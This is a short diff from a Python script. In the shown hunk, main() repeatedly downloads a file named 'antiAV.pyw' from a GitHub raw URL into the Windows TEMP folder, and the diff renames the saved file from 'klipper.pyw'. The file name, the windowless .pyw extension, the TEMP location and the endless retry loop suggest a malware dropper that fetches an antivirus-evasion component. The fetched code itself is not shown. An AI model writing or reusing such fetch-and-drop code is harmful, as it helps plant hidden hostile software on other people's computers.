@@ -28,7 +28,7 @@ def main():
             time.sleep(3)
 
     url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/antiAV.pyw'
-    path = os.path.join(os.getenv('TEMP') or '.', 'klipper.pyw')
+    path = os.path.join(os.getenv('TEMP') or '.', 'antiAV.pyw')
     while True:
         try:
             urllib.request.urlretrieve(url, path)
